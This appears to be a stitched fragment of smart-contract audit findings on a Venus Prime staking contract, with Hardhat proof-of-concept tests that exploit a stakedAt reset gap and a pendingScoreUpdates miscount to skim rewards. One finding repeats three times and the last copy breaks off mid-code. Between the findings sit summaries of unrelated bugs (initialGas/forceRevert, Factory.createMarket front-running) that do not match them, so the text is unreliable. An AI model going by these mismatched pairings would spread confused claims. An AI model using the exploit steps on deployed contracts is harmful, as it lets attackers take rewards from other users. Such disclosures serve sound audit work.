            "detail": "\n# Vulnerability details\n\n## Impact\nWhenever a new Prime token is created, the users `stakedAt` is reset to 0. This happens when the user `claim` a revocable token and when he is `issue` a revocable token, but it does not happen when a user is `issue` an irrevocable token.\n\nThis is `issue()`\n```javascript\nfunction issue(bool isIrrevocable, address[] calldata users) external {\n        _checkAccessAllowed(\"issue(bool,address[])\");\n\n        if (isIrrevocable) {\n            for (uint256 i = 0; i < users.length; ) {\n                Token storage userToken = tokens[users[i]];\n                if (userToken.exists && !userToken.isIrrevocable) {\n                    _upgrade(users[i]);\n                } else {\n                    // We don't reset here.\n                    _mint(true, users[i]);\n                    _initializeMarkets(users[i]);\n                }\n\n                unchecked {\n                    i++;\n                }\n            }\n        } else {\n            for (uint256 i = 0; i < users.length; ) {\n                _mint(false, users[i]);\n                _initializeMarkets(users[i]);\n                \n                // We reset stakedAt here\n                delete stakedAt[users[i]];\n\n                unchecked {\n                    i++;\n                }\n            }\n        }\n    }\n```\nWe can see that when a revocable token is issued and minted the user's `stakedAt` is reset to 0. Whenever a user's token is upgraded, his `stakedAt` has already been reset to 0 inside `claim`.\n\n```javascript\nfunction claim() external {\n        if (stakedAt[msg.sender] == 0) revert IneligibleToClaim();\n        if (block.timestamp - stakedAt[msg.sender] < STAKING_PERIOD) revert WaitMoreTime();\n        \n        // We reset stakedAt here\n        stakedAt[msg.sender] = 0;\n\n        _mint(false, msg.sender);\n        _initializeMarkets(msg.sender);\n    }\n```\n\nThe is only one time when we don't reset the user's `stakedAt` and it's when he is issued an irrevocable token.\n\nLet's see an example and see why this is a problem:\n1. Alice deposits 10k XVS.\n2. The protocol/DAO/admin decides to issue Alice an irrevocable prime token, because she deposited such a large amount of tokens. Keep in mind that the 90 day staking period still hasn't passed and her `stakedAt` is the original time that she deposited 10k XVS.\n3. Time passes and Alice decides to withdraw her entire XVS, so now she has 0 XVS. Her token isn't burned as she has an irrevocable token.\n4. Even more time passes and the protocol/DAO/admin decides to burn Alice's irrevocable token because she is inactive.\n5. EVEN more time passes and Alice returns to the protocol and instead of depositing anything, she calls `claim`.\nHer tx goes through, since her `stakedAt` wasn't reset to 0 when she got issued her irrevocable token.\n\nThis way, Alice claimed a revocable token without having any XVS staked in the contract.\n\n\n## Proof of Concept\nAdd the following line at the top of `tests/hardhat/Prime/Prime.ts`. We'll use this to simulate time passing\n```javascript\nimport { time } from \"@nomicfoundation/hardhat-network-helpers\";\n```\n\nPaste the following inside `tests/hardhat/Prime/Prime.ts` and run `npx hardhat test tests/hardhat/Prime/Prime.ts`.\n```javascript\nit.only(\"User can get Prime token without any XVS staked\", async () => {\n      // User1 deposits 10k XVS\n      await xvs.transfer(await user1.getAddress(), parseUnits(\"10000\", 18));\n      await xvs.connect(user1).approve(xvsVault.address, parseUnits(\"10000\", 18));\n      await xvsVault.connect(user1).deposit(xvs.address, 0, parseUnits(\"10000\", 18));\n      let userInfo = await xvsVault.getUserInfo(xvs.address, 0, user1.getAddress());\n      expect(userInfo.amount).to.eq(parseUnits(\"10000\", 18));\n\n      // Venus decides to issue an irrevocable Prime token to User1 for staking such a large amount.\n      // Note that the 90 day staking period still hasn't passed\n      await prime.issue(true, [user1.getAddress()]);\n      let token = await prime.tokens(user1.getAddress());\n      expect(token.exists).to.be.equal(true);\n      expect(token.isIrrevocable).to.be.equal(true);\n\n      // User1 withdraws her entire balance XVS\n      await xvsVault.connect(user1).requestWithdrawal(xvs.address, 0, parseUnits(\"10000\", 18));\n      userInfo = await xvsVault.getUserInfo(xvs.address, 0, user1.getAddress());\n      expect(userInfo.pendingWithdrawals).to.eq(parseUnits(\"10000\", 18));\n\n      // User1's Prime token gets burned by protocol\n      await prime.burn(user1.getAddress());\n      token = await prime.tokens(user1.getAddress());\n      expect(token.exists).to.be.equal(false);\n      expect(token.isIrrevocable).to.be.equal(false);\n\n      // 100 days pass\n      await time.increase(8640000);\n\n      // User1 can claim a revocable Prime token without any XVS staked, because his stakedAt wasn't reset to 0\n      expect(prime.stakedAt(await user1.getAddress())).to.not.be.equal(0);\n\n      await prime.connect(user1).claim();\n      token = await prime.tokens(user1.getAddress());\n      expect(token.exists).to.be.equal(true);\n      expect(token.isIrrevocable).to.be.equal(false);\n    });\n```\n\n\nIf you are having trouble running the test, this change might fix it. Inside `Prime.sol`, `burn()` remove the access control from the function. This doesn't change the attack and the test outcome.\n```javascript\nfunction burn(address user) external {\n        // _checkAccessAllowed(\"burn(address)\");\n        _burn(user);\n    }\n```\n\n\n## Tools Used\nManual review\nHardhat\n\n## Recommended Mitigation Steps\nReset the user's `stakedAt` whenever he is issued an irrevocable token.\n```javascript\nfunction issue(bool isIrrevocable, address[] calldata users) external {\n        _checkAccessAllowed(\"issue(bool,address[])\");\n\n        if (isIrrevocable) {\n            for (uint256 i = 0; i < users.length; ) {\n                Token storage userToken = tokens[users[i]];\n                if (userToken.exists && !userToken.isIrrevocable) {\n                    _upgrade(users[i]);\n                } else {\n                    _mint(true, users[i]);\n                    _initializeMarkets(users[i]);\n                    delete stakedAt[users[i]]; \n                }\n          ...\n\n```\n\n\n## Assessed type\n\nOther"

The vulnerability arises because the `initialGas` state variable persists across external function calls, enabling an attacker to manipulate the contract's state. Specifically, the attacker can trigger `forceRevert()` to withdraw gas budget using a failed call and then perform a successful call that doesn't change `initialGas`, followed by a small deposit of gas to avoid transaction failure due to lack of budget. As a result, funds could become locked. To mitigate this issue, adding a reentrancy guard or additional checks on `_forceRevert` calls is advised.",

            "detail": "\n# Vulnerability details\n\n## Note\nAll functions/properties referred to are in the `Prime.sol` contract.\n## Impact\nA malicious user can accrue outsized rewards at the expense of other users after `updateAlpha()` or `updateMultipliers()` is called.\n\n## Proof of Concept\nAn attacker can prevent their score from being updated and decreased after the protocol's alpha or multipliers change. This is done by manipulatively decreasing the value of `pendingScoreUpdates`, then ensuring that only other user scores are updated until `pendingScoreUpdates` reaches zero, at which point calls to `updateScores()` will revert with the error `NoScoreUpdatesRequired()`. This can be done via the attacker calling `updateScores()` to update other users' scores first and/or DoSing calls to `updateScores()` that would update the attacker's score (see the issue titled \"DoS and gas griefing of Prime.updateScores()\").\n\nThe core of this vulnerability is the attacker's ability to manipulate `pendingScoreUpdates`. Notice below that `claim()`, which is called to mint a user's Prime token, doesn't change the value of `pendingScoreUpdates`:\n```\n    function claim() external { \n        if (stakedAt[msg.sender] == 0) revert IneligibleToClaim();\n        if (block.timestamp - stakedAt[msg.sender] < STAKING_PERIOD) revert WaitMoreTime();\n\n        stakedAt[msg.sender] = 0;\n\n        _mint(false, msg.sender);\n        _initializeMarkets(msg.sender);\n    }\n    function _mint(bool isIrrevocable, address user) internal {\n        if (tokens[user].exists) revert IneligibleToClaim();\n\n        tokens[user].exists = true;\n        tokens[user].isIrrevocable = isIrrevocable;\n\n        if (isIrrevocable) {\n            totalIrrevocable++;\n        } else {\n            totalRevocable++;\n        }\n\n        if (totalIrrevocable > irrevocableLimit || totalRevocable > revocableLimit) revert InvalidLimit();\n\n        emit Mint(user, isIrrevocable);\n    }\n    function _initializeMarkets(address account) internal {\n        address[] storage _allMarkets = allMarkets;\n        for (uint256 i = 0; i < _allMarkets.length; ) {\n            address market = _allMarkets[i];\n            accrueInterest(market);\n\n            interests[market][account].rewardIndex = markets[market].rewardIndex;\n            uint256 score = _calculateScore(market, account);\n            interests[market][account].score = score;\n            markets[market].sumOfMembersScore = markets[market].sumOfMembersScore + score;\n\n            unchecked {\n                i++;\n            }\n        }\n    }\n```\nHowever, burning a token decrements `pendingScoreUpdates`. (Burning a token is done by withdrawing XVS from `XVSVault.sol` so that the resulting amount staked is below the minimum amount required to possess a Prime token.) Notice below:\n```\n    function _burn(address user) internal {\n        ...\n        _updateRoundAfterTokenBurned(user);\n\n        emit Burn(user);\n    }\n    function _updateRoundAfterTokenBurned(address user) internal { \n        if (totalScoreUpdatesRequired > 0) totalScoreUpdatesRequired--;\n\n        if (pendingScoreUpdates > 0 && !isScoreUpdated[nextScoreUpdateRoundId][user]) {\n            pendingScoreUpdates--;\n        }\n    }\n```\nTo inappropriately decrement the value of `pendingScoreUpdates`, the attacker can backrun the transaction updating the alpha/multiplier, minting and burning a Prime token (this requires the attacker to have staked the minimum amount of XVS 90 days in advance). If the number of Prime tokens minted is often at the max number of Prime tokens minted, the attacker could burn an existing token and then mint and burn a new one. Since the value of `!isScoreUpdated[nextScoreUpdateRoundId][user]` is default false, pendingScoreUpdates will be inappropriately decremented if the burned token was minted after the call to `updateMultipliers()`/`updateAlpha()`. \n\nAs aforementioned, the attacker can ensure that only other users' scores are updated until `pendingScoreUpdates` reaches zero, at which point further calls to `updateScores` will revert with the custom error `NoScoreUpdatesRequired()`.\n\nRelevant code from `updateScores()` for reference:\n```\n    function updateScores(address[] memory users) external {\n        if (pendingScoreUpdates == 0) revert NoScoreUpdatesRequired(); \n        if (nextScoreUpdateRoundId == 0) revert NoScoreUpdatesRequired();\n\n        for (uint256 i = 0; i < users.length; ) {\n            ...\n            pendingScoreUpdates--;\n            isScoreUpdated[nextScoreUpdateRoundId][user] = true;\n\n            unchecked {\n                i++;\n            }\n\n            emit UserScoreUpdated(user);\n        }\n    }\n```\nAs seen, the attacker's score can avoid being updated. This is signficant if a change in multiplier or alpha would decrease the attacker's score. Because rewards are distributed according to the user's score divided by the total score, the attacker can 'freeze' their score at a higher than appropriate value and accrue increased rewards at the cost of the other users in the market.\n\nThe attacker can also prevent score updates for other users. The attacker can 'freeze' a user's score that would otherwise increase after the alpha/multiplier changes, resulting in even greater rewards accrued for the attacker and denied from other users. This is because it is possible to decrease the value of `pendingScoreUpdates` by more than one if the attacker mints and burns more than one token after the alpha/multiplier is updated.\n\n## Math to support that a larger score results in greater reward accrual\nLet $a$ represent the attacker's score if it is properly updated after a change in alpha/multiplier, $b$ represent the properly updated total score, and $c$ represent the difference between the attacker's larger unupdated score and the attacker's smaller updated score. Clearly $a$, $b$, and $c$ are positive with $a < b$. Consider the following inequality, which holds true since $a<b$ :\n\n$\\frac{a+c}{b+c} > \\frac{a}{b} \\iff a+c > \\frac{a(b+c)}{b} \\iff a+c > a+\\frac{ac}{b}$\n## Test\nPaste and run the below test in the 'mint and burn' scenario in Prime.ts (line 302)\n```\n    it(\"prevent_Update\", async () => { //test to show attacker can arbitrarily prevent multiple users from being updated by `updateScores()`\n      //setup 3 users\n      await prime.issue(false, [user1.getAddress(), user2.getAddress(), user3.getAddress()]);\n      await xvs.connect(user1).approve(xvsVault.address, bigNumber18.mul(1000));\n      await xvsVault.connect(user1).deposit(xvs.address, 0, bigNumber18.mul(1000));\n      await xvs.connect(user2).approve(xvsVault.address, bigNumber18.mul(1000));\n      await xvsVault.connect(user2).deposit(xvs.address, 0, bigNumber18.mul(1000));\n      await xvs.connect(user3).approve(xvsVault.address, bigNumber18.mul(1000));\n      await xvsVault.connect(user3).deposit(xvs.address, 0, bigNumber18.mul(1000));\n      //attacker sets up addresses to mint/burn and manipulate pendingScoreUpdates\n      const [,,,,user4,user5] = await ethers.getSigners();\n      await xvs.transfer(user4.address, bigNumber18.mul(1000000));\n      await xvs.transfer(user5.address, bigNumber18.mul(1000000));\n      await xvs.connect(user4).approve(xvsVault.address, bigNumber18.mul(1000));\n      await xvsVault.connect(user4).deposit(xvs.address, 0, bigNumber18.mul(1000));\n      await xvs.connect(user5).approve(xvsVault.address, bigNumber18.mul(1000));\n      await xvsVault.connect(user5).deposit(xvs.address, 0, bigNumber18.mul(1000));\n      await mine(90 * 24 * 60 * 60);\n      //change alpha, pendingScoreUpdates changed to 3\n      await prime.updateAlpha(1, 5);\n      //attacker backruns alpha update with minting and burning tokens, decreasing pendingScoreUpdates by 2\n      await prime.connect(user4).claim();\n      await xvsVault.connect(user4).requestWithdrawal(xvs.address, 0, bigNumber18.mul(1000));\n      await prime.connect(user5).claim();\n      await xvsVault.connect(user5).requestWithdrawal(xvs.address, 0, bigNumber18.mul(1000));\n      //attacker updates user 3, decreasing pendingScoreUpdates by 1\n      await prime.connect(user1).updateScores([user3.getAddress()])\n      //users 1 and 2 won't be updated because pendingScoreUpdates is 0\n      await expect(prime.updateScores([user1.getAddress(), user2.getAddress()])).to.be.revertedWithCustomError(prime, \"NoScoreUpdatesRequired\");\n    });\n```\n## Tools Used\nHardhat\n## Recommended Mitigation Steps\nCheck if `pendingScoreUpdates` is nonzero when a token is minted, and increment it if so. This removes the attacker's ability to manipulate `pendingScoreUpdates`.\n```diff\n    function _mint(bool isIrrevocable, address user) internal {\n        if (tokens[user].exists) revert IneligibleToClaim();\n\n        tokens[user].exists = true;\n        tokens[user].isIrrevocable = isIrrevocable;\n\n        if (isIrrevocable) { //@Gas\n            totalIrrevocable++;\n        } else {\n            totalRevocable++;\n        }\n\n        if (totalIrrevocable > irrevocableLimit || totalRevocable > revocableLimit) revert InvalidLimit();\n+       if (pendingScoreUpdates != 0) {unchecked{++pendingScoreUpdates;}} \n\n        emit Mint(user, isIrrevocable);\n    }\n```\n## Further Considerations\nThe call to `updateMultipliers()` can be frontrun by the attacker with staking XVS and/or lending/borrowing transactions in order to increase the attacker's score before 'freezing' it.\n\nIf the attacker wants to keep the inflated score, no actions that update the attacker's score can be taken. However, the attacker can claim the outsized rewards earned at any time and as often as desired since `claimInterest()` does not update user scores.\n\nIf anyone has knowledge that the exploit has occurred, it is possible for any user's score in a market to be updated with a call to `accrueInterestAndUpdateScore()`, which can neutralize the attack.\n\nThe required amount of XVS staked for this exploit can be reduced by 1000 if this exploit is combined with the exploit titled \"Irrevocable token holders can instantly mint a revocable token after burning and bypass the minimum XVS stake for revocable tokens\".\n\n\n## Assessed type\n\nOther"

This leads to the contract incorrectly recording the total amount claimed by the user, allowing the same amount to be repeatedly claimed. The vulnerability is an accounting logic flaw that could potentially be magnified through reentrancy if reentrant calls are allowed.

            "detail": "\n# Vulnerability details\n\n## Note\nAll functions/properties referred to are in the `Prime.sol` contract.\n## Impact\nA malicious user can accrue outsized rewards at the expense of other users after `updateAlpha()` or `updateMultipliers()` is called.\n\n## Proof of Concept\nAn attacker can prevent their score from being updated and decreased after the protocol's alpha or multipliers change. This is done by manipulatively decreasing the value of `pendingScoreUpdates`, then ensuring that only other user scores are updated until `pendingScoreUpdates` reaches zero, at which point calls to `updateScores()` will revert with the error `NoScoreUpdatesRequired()`. This can be done via the attacker calling `updateScores()` to update other users' scores first and/or DoSing calls to `updateScores()` that would update the attacker's score (see the issue titled \"DoS and gas griefing of Prime.updateScores()\").\n\nThe core of this vulnerability is the attacker's ability to manipulate `pendingScoreUpdates`. Notice below that `claim()`, which is called to mint a user's Prime token, doesn't change the value of `pendingScoreUpdates`:\n```\n    function claim() external { \n        if (stakedAt[msg.sender] == 0) revert IneligibleToClaim();\n        if (block.timestamp - stakedAt[msg.sender] < STAKING_PERIOD) revert WaitMoreTime();\n\n        stakedAt[msg.sender] = 0;\n\n        _mint(false, msg.sender);\n        _initializeMarkets(msg.sender);\n    }\n    function _mint(bool isIrrevocable, address user) internal {\n        if (tokens[user].exists) revert IneligibleToClaim();\n\n        tokens[user].exists = true;\n        tokens[user].isIrrevocable = isIrrevocable;\n\n        if (isIrrevocable) {\n            totalIrrevocable++;\n        } else {\n            totalRevocable++;\n        }\n\n        if (totalIrrevocable > irrevocableLimit || totalRevocable > revocableLimit) revert InvalidLimit();\n\n        emit Mint(user, isIrrevocable);\n    }\n    function _initializeMarkets(address account) internal {\n        address[] storage _allMarkets = allMarkets;\n        for (uint256 i = 0; i < _allMarkets.length; ) {\n            address market = _allMarkets[i];\n            accrueInterest(market);\n\n            interests[market][account].rewardIndex = markets[market].rewardIndex;\n            uint256 score = _calculateScore(market, account);\n            interests[market][account].score = score;\n            markets[market].sumOfMembersScore = markets[market].sumOfMembersScore + score;\n\n            unchecked {\n                i++;\n            }\n        }\n    }\n```\nHowever, burning a token decrements `pendingScoreUpdates`. (Burning a token is done by withdrawing XVS from `XVSVault.sol` so that the resulting amount staked is below the minimum amount required to possess a Prime token.) Notice below:\n```\n    function _burn(address user) internal {\n        ...\n        _updateRoundAfterTokenBurned(user);\n\n        emit Burn(user);\n    }\n    function _updateRoundAfterTokenBurned(address user) internal { \n        if (totalScoreUpdatesRequired > 0) totalScoreUpdatesRequired--;\n\n        if (pendingScoreUpdates > 0 && !isScoreUpdated[nextScoreUpdateRoundId][user]) {\n            pendingScoreUpdates--;\n        }\n    }\n```\nTo inappropriately decrement the value of `pendingScoreUpdates`, the attacker can backrun the transaction updating the alpha/multiplier, minting and burning a Prime token (this requires the attacker to have staked the minimum amount of XVS 90 days in advance). If the number of Prime tokens minted is often at the max number of Prime tokens minted, the attacker could burn an existing token and then mint and burn a new one. Since the value of `!isScoreUpdated[nextScoreUpdateRoundId][user]` is default false, pendingScoreUpdates will be inappropriately decremented if the burned token was minted after the call to `updateMultipliers()`/`updateAlpha()`. \n\nAs aforementioned, the attacker can ensure that only other users' scores are updated until `pendingScoreUpdates` reaches zero, at which point further calls to `updateScores` will revert with the custom error `NoScoreUpdatesRequired()`.\n\nRelevant code from `updateScores()` for reference:\n```\n    function updateScores(address[] memory users) external {\n        if (pendingScoreUpdates == 0) revert NoScoreUpdatesRequired(); \n        if (nextScoreUpdateRoundId == 0) revert NoScoreUpdatesRequired();\n\n        for (uint256 i = 0; i < users.length; ) {\n            ...\n            pendingScoreUpdates--;\n            isScoreUpdated[nextScoreUpdateRoundId][user] = true;\n\n            unchecked {\n                i++;\n            }\n\n            emit UserScoreUpdated(user);\n        }\n    }\n```\nAs seen, the attacker's score can avoid being updated. This is signficant if a change in multiplier or alpha would decrease the attacker's score. Because rewards are distributed according to the user's score divided by the total score, the attacker can 'freeze' their score at a higher than appropriate value and accrue increased rewards at the cost of the other users in the market.\n\nThe attacker can also prevent score updates for other users. The attacker can 'freeze' a user's score that would otherwise increase after the alpha/multiplier changes, resulting in even greater rewards accrued for the attacker and denied from other users. This is because it is possible to decrease the value of `pendingScoreUpdates` by more than one if the attacker mints and burns more than one token after the alpha/multiplier is updated.\n\n## Math to support that a larger score results in greater reward accrual\nLet $a$ represent the attacker's score if it is properly updated after a change in alpha/multiplier, $b$ represent the properly updated total score, and $c$ represent the difference between the attacker's larger unupdated score and the attacker's smaller updated score. Clearly $a$, $b$, and $c$ are positive with $a < b$. Consider the following inequality, which holds true since $a<b$ :\n\n$\\frac{a+c}{b+c} > \\frac{a}{b} \\iff a+c > \\frac{a(b+c)}{b} \\iff a+c > a+\\frac{ac}{b}$\n## Test\nPaste and run the below test in the 'mint and burn' scenario in Prime.ts (line 302)\n```\n    it(\"prevent_Update\", async () => { //test to show attacker can arbitrarily prevent multiple users from being updated by `updateScores()`\n      //setup 3 users\n      await prime.issue(false, [user1.getAddress(), user2.getAddress(), user3.getAddress()]);\n      await xvs.connect(user1).approve(xvsVault.address, bigNumber18.mul(1000));\n      await xvsVault.connect(user1).deposit(xvs.address, 0, bigNumber18.mul(1000));\n      await xvs.connect(user2).approve(xvsVault.address, bigNumber18.mul(1000));\n      await xvsVault.connect(user2).deposit(xvs.address, 0, bigNumber18.mul(1000));\n      await xvs.connect(user3).approve(xvsVault.address, bigNumber18.mul(1000));\n      await xvsVault.connect(user3).deposit(xvs.address, 0, bigNumber18.mul(1000));\n      //attacker sets up addresses to mint/burn and manipulate pendingScoreUpdates\n      const [,,,,user4,user5] = await ethers.getSigners();\n      await xvs.transfer(user4.address, bigNumber18.mul(1000000));\n      await xvs.transfer(user5.address, bigNumber18.mul(1000000));\n      await xvs.connect(user4).approve(xvsVault.address, bigNumber18.mul(1000));\n      await xvsVault.connect(user4).deposit(xvs.address, 0, bigNumber18.mul(1000));\n      await xvs.connect(user5).approve(xvsVault.address, bigNumber18.mul(1000));\n      await xvsVault.connect(user5).deposit(xvs.address, 0, bigNumber18.mul(1000));\n      await mine(90 * 24 * 60 * 60);\n      //change alpha, pendingScoreUpdates changed to 3\n      await prime.updateAlpha(1, 5);\n      //attacker backruns alpha update with minting and burning tokens, decreasing pendingScoreUpdates by 2\n      await prime.connect(user4).claim();\n      await xvsVault.connect(user4).requestWithdrawal(xvs.address, 0, bigNumber18.mul(1000));\n      await prime.connect(user5).claim();\n      await xvsVault.connect(user5).requestWithdrawal(xvs.address, 0, bigNumber18.mul(1000));\n      //attacker updates user 3, decreasing pendingScoreUpdates by 1\n      await prime.connect(user1).updateScores([user3.getAddress()])\n      //users 1 and 2 won't be updated because pendingScoreUpdates is 0\n      await expect(prime.updateScores([user1.getAddress(), user2.getAddress()])).to.be.revertedWithCustomError(prime, \"NoScoreUpdatesRequired\");\n    });\n```\n## Tools Used\nHardhat\n## Recommended Mitigation Steps\nCheck if `pendingScoreUpdates` is nonzero when a token is minted, and increment it if so. This removes the attacker's ability to manipulate `pendingScoreUpdates`.\n```diff\n    function _mint(bool isIrrevocable, address user) internal {\n        if (tokens[user].exists) revert IneligibleToClaim();\n\n        tokens[user].exists = true;\n        tokens[user].isIrrevocable = isIrrevocable;\n\n        if (isIrrevocable) { //@Gas\n            totalIrrevocable++;\n        } else {\n            totalRevocable++;\n        }\n\n        if (totalIrrevocable > irrevocableLimit || totalRevocable > revocableLimit) revert InvalidLimit();\n+       if (pendingScoreUpdates != 0) {unchecked{++pendingScoreUpdates;}} \n\n        emit Mint(user, isIrrevocable);\n    }\n```\n## Further Considerations\nThe call to `updateMultipliers()` can be frontrun by the attacker with staking XVS and/or lending/borrowing transactions in order to increase the attacker's score before 'freezing' it.\n\nIf the attacker wants to keep the inflated score, no actions that update the attacker's score can be taken. However, the attacker can claim the outsized rewards earned at any time and as often as desired since `claimInterest()` does not update user scores.\n\nIf anyone has knowledge that the exploit has occurred, it is possible for any user's score in a market to be updated with a call to `accrueInterestAndUpdateScore()`, which can neutralize the attack.\n\nThe required amount of XVS staked for this exploit can be reduced by 1000 if this exploit is combined with the exploit titled \"Irrevocable token holders can instantly mint a revocable token after burning and bypass the minimum XVS stake for revocable tokens\".\n\n\n## Assessed type\n\nOther"

In the described scenario, an attacker can observe a pending transaction on the blockchain that intends to create a new market using `Factory.createMarket`. Since the initial depositor's address `_references[4]` and the deposit amount `_conditions[1]` are specified in the transaction, the attacker can construct a new transaction that also calls `Factory.createMarket`, but with different parameters that are beneficial to the attacker. Importantly, the attacker can set the `_conditions[1]` to match the victim's intended deposit amount and set `_references[4]` to the victim's address. If the attacker's transaction is confirmed before the victim's transaction, since the initial depositor has only approved the vault to transfer funds on their behalf, the attacker's market will be created using the depositor's funds without their consent, and in a configuration that the depositor did not intend.

            "detail": "\n# Vulnerability details\n\n## Note\nAll functions/properties referred to are in the `Prime.sol` contract.\n## Impact\nA malicious user can accrue outsized rewards at the expense of other users after `updateAlpha()` or `updateMultipliers()` is called.\n\n## Proof of Concept\nAn attacker can prevent their score from being updated and decreased after the protocol's alpha or multipliers change. This is done by manipulatively decreasing the value of `pendingScoreUpdates`, then ensuring that only other user scores are updated until `pendingScoreUpdates` reaches zero, at which point calls to `updateScores()` will revert with the error `NoScoreUpdatesRequired()`. This can be done via the attacker calling `updateScores()` to update other users' scores first and/or DoSing calls to `updateScores()` that would update the attacker's score (see the issue titled \"DoS and gas griefing of Prime.updateScores()\").\n\nThe core of this vulnerability is the attacker's ability to manipulate `pendingScoreUpdates`. Notice below that `claim()`, which is called to mint a user's Prime token, doesn't change the value of `pendingScoreUpdates`:\n```\n    function claim() external { \n        if (stakedAt[msg.sender] == 0) revert IneligibleToClaim();\n        if (block.timestamp - stakedAt[msg.sender] < STAKING_PERIOD) revert WaitMoreTime();\n\n        stakedAt[msg.sender] = 0;\n\n        _mint(false, msg.sender);\n        _initializeMarkets(msg.sender);\n    }\n    function _mint(bool isIrrevocable, address user) internal {\n        if (tokens[user].exists) revert IneligibleToClaim();\n\n        tokens[user].exists = true;\n        tokens[user].isIrrevocable = isIrrevocable;\n\n        if (isIrrevocable) {\n            totalIrrevocable++;\n        } else {\n            totalRevocable++;\n        }\n\n        if (totalIrrevocable > irrevocableLimit || totalRevocable > revocableLimit) revert InvalidLimit();\n\n        emit Mint(user, isIrrevocable);\n    }\n    function _initializeMarkets(address account) internal {\n        address[] storage _allMarkets = allMarkets;\n        for (uint256 i = 0; i < _allMarkets.length; ) {\n            address market = _allMarkets[i];\n            accrueInterest(market);\n\n            interests[market][account].rewardIndex = markets[market].rewardIndex;\n            uint256 score = _calculateScore(market, account);\n            interests[market][account].score = score;\n            markets[market].sumOfMembersScore = markets[market].sumOfMembersScore + score;\n\n            unchecked {\n                i++;\n            }\n        }\n    }\n```\nHowever, burning a token decrements `pendingScoreUpdates`. (Burning a token is done by withdrawing XVS from `XVSVault.sol` so that the resulting amount staked is below the minimum amount required to possess a Prime token.) Notice below:\n```\n    function _burn(address user) internal {\n        ...\n        _updateRoundAfterTokenBurned(user);\n\n        emit Burn(user);\n    }\n    function _updateRoundAfterTokenBurned(address user) internal { \n        if (totalScoreUpdatesRequired > 0) totalScoreUpdatesRequired--;\n\n        if (pendingScoreUpdates > 0 && !isScoreUpdated[nextScoreUpdateRoundId][user]) {\n            pendingScoreUpdates--;\n        }\n    }\n```\nTo inappropriately decrement the value of `pendingScoreUpdates`, the attacker can backrun the transaction updating the alpha/multiplier, minting and burning a Prime token (this requires the attacker to have staked the minimum amount of XVS 90 days in advance). If the number of Prime tokens minted is often at the max number of Prime tokens minted, the attacker could burn an existing token and then mint and burn a new one. Since the value of `!isScoreUpdated[nextScoreUpdateRoundId][user]` is default false, pendingScoreUpdates will be inappropriately decremented if the burned token was minted after the call to `updateMultipliers()`/`updateAlpha()`. \n\nAs aforementioned, the attacker can ensure that only other users' scores are updated until `pendingScoreUpdates` reaches zero, at which point further calls to `updateScores` will revert with the custom error `NoScoreUpdatesRequired()`.\n\nRelevant code from `updateScores()` for reference:\n```\n    function updateScores(address[] memory users) external {\n        if (pendingScoreUpdates == 0) revert NoScoreUpdatesRequired(); \n        if (nextScoreUpdateRoundId == 0) revert NoScoreUpdatesRequired();\n\n        for (uint256 i = 0; i < users.length; ) {\n            ...\n            pendingScoreUpdates--;\n            isScoreUpdated[nextScoreUpdateRoundId][user] = true;\n\n            unchecked {\n                i++;\n            }\n\n            emit UserScoreUpdated(user);\n        }\n    }\n```\nAs seen, the attacker's score can avoid being updated. This is signficant if a change in multiplier or alpha would decrease the attacker's score. Because rewards are distributed according to the user's score divided by the total score, the attacker can 'freeze' their score at a higher than appropriate value and accrue increased rewards at the cost of the other users in the market.\n\nThe attacker can also prevent score updates for other users. The attacker can 'freeze' a user's score that would otherwise increase after the alpha/multiplier changes, resulting in even greater rewards accrued for the attacker and denied from other users. This is because it is possible to decrease the value of `pendingScoreUpdates` by more than one if the attacker mints and burns more than one token after the alpha/multiplier is updated.\n\n## Math to support that a larger score results in greater reward accrual\nLet $a$ represent the attacker's score if it is properly updated after a change in alpha/multiplier, $b$ represent the properly updated total score, and $c$ represent the difference between the attacker's larger unupdated score and the attacker's smaller updated score. Clearly $a$, $b$, and $c$ are positive with $a < b$. Consider the following inequality, which holds true since $a<b$ :\n\n$\\frac{a+c}{b+c} > \\frac{a}{b} \\iff a+c > \\frac{a(b+c)}{b} \\iff a+c > a+\\frac{ac}{b}$\n## Test\nPaste and run the below test in the 'mint and burn' scenario in Prime.ts (line 302)\n```\n    it(\"prevent_Update\", async () => { //test to show attacker can arbitrarily prevent multiple users from being updated by `updateScores()`\n      //setup 3 users\n      await prime.issue(false, [user1.getAddress(), user2.getAddress(), user3.getAddress()]);\n      await xvs.connect(user1).approve(xvsVault.address, bigNumber18.mul(1000));\n      await xvsVault.connect(user1).deposit(xvs.address, 0, bigNumber18.mul(1000));\n      await xvs.connect(user2).approve(xvsVault.address, bigNumber18.mul(1000));\n      await xvsVault.connect(user2).deposit(xvs.address, 0, bigNumber18.mul(1000));\n      await xvs.connect(user3).approve(xvsVault.address, bigNumber18.mul(1000));\n      await xvsVault.connect(user3).deposit(xvs.address, 0, bigNumber18.mul(1000));\n      //attacker sets up addresses to mint/burn and manipulate pendingScoreUpdates\n      const [,,,,user4,user5] = await ethers.getSigners();\n      await xvs.transfer(user4.address, bigNumber18.mul(1000000));\n      await xvs.transfer(user5.address, bigNumber18.mul(1000000));\n      await xvs.connect(user4).approve(xvsVault.address, bigNumber18.mul(1000));\n      await xvsVault.connect(user4).deposit(xvs.address, 0, bigNumber18.mul(1000));\n      await xvs.connect(user5).approve(xvsVault.address, bigNumber18.mul(1000));\n      await xvsVault.connect(user5).deposit(xvs.address, 0, bigNumber18.mul(1000));\n      await mine(90 * 24 * 60 * 60);\n      //change alpha, pendingScoreUpdates changed to 3\n      await prime.updateAlpha(1, 5);\n      //attacker backruns alpha update with minting and burning tokens, decreasing pendingScoreUpdates by 2\n      await prime.connect(user4).claim();\n      await xvsVault.connect(user4).requestWithdrawal(xvs.address, 0, bigNumber18.mul(1000));\n      await prime.connect(user5).claim();\n      await xvsVault.connect(user5).requestWithdrawal(xvs.address, 0, bigNumber18.mul(1000));\n      //attacker updates user 3, decreasing pendingScoreUpdates by 1\n      await prime.connect(user1).updateScores([user3.getAddress()])\n      //users 1 and 2 won't be updated because pendingScoreUpdates is 0\n      await expect(prime.updateScores([user1.getAddress(), user2.getAddress()])).to.be.revertedWithCustomError(prime, \"NoScoreUpdatesRequired\");\n    });\n```\n## Tools Used\nHardhat\n## Recommended Mitigation Steps\nCheck if `pendingScoreUpdates` is nonzero when a token is minted, and increment it if so. This removes the attacker's ability to manipulate `pendingScoreUpdates`.\n```diff\n    function _mint(bool isIrrevocable, address user) internal {\n        if (tokens[user].exists) revert IneligibleToClaim();\n\n        tokens[user].exists = true;\n        tokens[user].isIrrevocable = isIrrevocable;\n\n        if (isIrrevocable) { //@Gas\n            totalIrrevocable++;\n        } else {\n            totalRevocable++;\n        }\n\n        if 